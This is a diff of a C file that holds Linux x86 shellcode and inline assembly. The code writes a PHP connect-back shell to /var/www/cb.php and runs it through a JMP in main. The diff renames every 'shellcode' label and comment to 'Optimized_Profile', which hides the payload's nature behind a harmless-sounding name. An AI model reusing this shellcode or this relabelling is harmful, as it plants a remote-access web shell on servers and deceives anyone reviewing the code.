@@ -1,12 +1,12 @@
 /*
 #include <stdlib.h>
 
-        /* Grayscale Research: Linux Write FS PHP Connect Back Utility Shellcode
+        /* Grayscale Research: Linux Write FS PHP Connect Back Utility Optimized_Profile
          *
          *      Function:
          *              Opens /var/www/cb.php and writes a php connectback shell to the filesystem.
          *
-         *      Shellcode Size: 508 bytes (No Encodings)
+         *      Optimized_Profile Size: 508 bytes (No Encodings)
          *
          *      PHP Shell Usage:
          *              // victim
@@ -22,7 +22,7 @@
          */
 
 
-	// shellcode
+	// optimized_profile
  	    char sc[] = "\x68\x70\x68\x70\xff\x68\x2f\x63\x62\x2e\x68\x2f\x77\x77\x77\x68"
 			 "\x2f\x76\x61\x72\x31\xc0\x89\xe6\x88\x46\x0f\x89\xe3\x31\xc9\xb1"
 			 "\x42\x31\xd2\xb2\xff\x31\xc0\xb0\x05\xcd\x80\x31\xdb\x88\xc3\x68"
@@ -60,12 +60,12 @@
 int main(){
 
 
-	// run shellcode
+	// run optimized_profile
         asm("JMP %0;" : "=m" (sc));
 
 	/*
 		asm volatile(
-		    "cb_shellcode:\n"
+		    "cb_optimized_profile:\n"
 		    "push $0xff706870;"
 		    "push $0x2e62632f;"
 		    "push $0x7777772f;"
@@ -88,7 +88,7 @@ int main(){
 		    "xor %ebx, %ebx;"
 		    "mov %al, %bl;"
 
-			// php connectback shellcode
+			// php connectback optimized_profile
 			"push $0xffff3e3f; push $0x7d207d3b; push $0x29297224; push $0x286e656c;"
 			"push $0x72747320; push $0x2c722420; push $0x2c6b636f; push $0x73242865;"
 			"push $0x74697277; push $0x5f74656b; push $0x636f733b; push $0x22202431;"
